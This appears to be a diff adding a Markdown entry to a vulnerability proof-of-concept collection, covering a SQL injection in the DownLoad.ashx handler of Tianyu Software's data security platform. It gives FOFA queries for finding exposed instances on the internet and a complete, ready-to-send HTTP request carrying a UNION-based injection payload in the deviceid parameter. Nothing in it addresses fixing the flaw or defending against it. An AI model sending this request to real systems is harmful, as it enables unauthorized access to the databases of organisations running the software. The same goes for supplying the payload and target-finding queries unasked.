@@ -1,0 +1,30 @@
+# 天喻软件数据安全平台DownLoad.ashx存在SQL注入
+
+天喻软件数据安全平台接口`  /handler/DownLoad.ashx?operatetype=downloadsetupdll&deviceid= `存在SQL注入
+
+## fofa
+
+```yaml
+app="天喻软件数据安全平台"
+body="数据安全" && body="天喻"
+```
+
+## poc
+
+```json
+GET /handler/DownLoad.ashx?operatetype=downloadsetupdll&deviceid=1%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%2880%29%2BCHAR%28100%29%2BCHAR%2873%29%2BCHAR%28122%29%2BCHAR%2878%29%2BCHAR%2882%29%2BCHAR%2886%29%2BCHAR%28103%29%2BCHAR%2875%29%2BCHAR%2888%29%2BCHAR%28109%29%2BCHAR%2874%29%2BCHAR%28101%29%2BCHAR%2868%29%2BCHAR%28111%29%2BCHAR%2889%29%2BCHAR%28111%29%2BCHAR%28114%29%2BCHAR%28114%29%2BCHAR%2869%29%2BCHAR%2886%29%2BCHAR%2869%29%2BCHAR%28122%29%2BCHAR%2881%29%2BCHAR%2882%29%2BCHAR%2883%29%2BCHAR%2868%29%2BCHAR%28110%29%2BCHAR%28114%29%2BCHAR%28103%29%2BCHAR%28119%29%2BCHAR%2881%29%2BCHAR%2899%29%2BCHAR%28120%29%2BCHAR%28110%29%2BCHAR%28104%29%2BCHAR%2872%29%2BCHAR%2885%29%2BCHAR%28111%29%2BCHAR%2868%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+FVCt HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=1
+```
+
+![image-20240713004046148](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407130040230.png)
+
+## 漏洞来源
+
+- https://mp.weixin.qq.com/s/uRI79A1q6dJLd965fjkSyw
